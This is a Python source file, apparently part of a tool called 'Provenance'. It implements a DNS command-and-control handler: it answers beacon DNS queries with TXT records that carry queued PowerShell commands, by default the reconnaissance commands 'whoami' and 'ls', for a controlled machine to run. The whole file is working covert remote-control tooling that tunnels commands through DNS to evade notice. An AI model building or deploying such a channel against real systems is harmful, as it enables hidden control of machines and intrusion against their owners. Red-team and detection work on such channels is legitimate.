import dnslib
import logging
from backend.handlers.protocolhandler import ProtocolHandler, Commands
from enum import Enum


class Records(Enum):
    """ The types of records the DNSHandler can currently encode """
    TXT = (dnslib.QTYPE.TXT, dnslib.TXT)


class DNSHandler(ProtocolHandler):
    """ This represents a machine being controlled by Provenance"""

    def __init__(self, ip, socket, rrtype=Records.TXT, name=None):
        self.logger = logging.getLogger("Provenance")
        self.name = name
        self.ip = ip
        self.socket = socket
        self.record_type = rrtype
        self.latest_request_id = None
        self.queued_commands = [(Commands.POWERSHELL, "whoami"), (Commands.POWERSHELL, "ls")]
        self.sent_commands = []
    
    def __repr__(self):
        return f"{self.name}{{{self.ip}, {self.record_type}}}"
    
    def queue_command(self, cmd_type, cmd):
        self.queued_commands.append((Commands[cmd_type], cmd))

    def handle_request(self, raw_request, port):
        data = raw_request[0].strip()
        try:
            request = dnslib.DNSRecord.parse(data)
            if request.header.id != self.latest_request_id:
                if request.header.get_opcode() == 0:
                    self.latest_request_id = request.header.id
                    self.send_command(request, port)
        except dnslib.DNSError:
            self.logger.info("Incorrectly formatted DNS Query. Skipping")
    
    def send_command(self, request, port):
        if self.queued_commands:
            opcode, cmd = self.queued_commands.pop()
        else:
            opcode, cmd = (Commands.NOP, "NONE")
        # get the type of record this beacon is ready to receive
        rr_type, rr_constructor = self.record_type.value
        # Generate skeleton question for packet
        command_packet = request.reply() 
        # Generate the response to the question
        command_packet.add_answer(
            dnslib.RR(
                rname=request.get_q().get_qname(),
                rtype=rr_type,
                rclass=dnslib.CLASS.IN,
                rdata=rr_constructor(f"<{opcode.value}>:{cmd}"),
                ttl=1337))
        # send command
        self.logger.info(f"Sending '{cmd}' to {(self.ip, port)}")
        self.socket.sendto(command_packet.pack(), (self.ip, port))
        self.sent_commands.append((request.header.id, cmd))

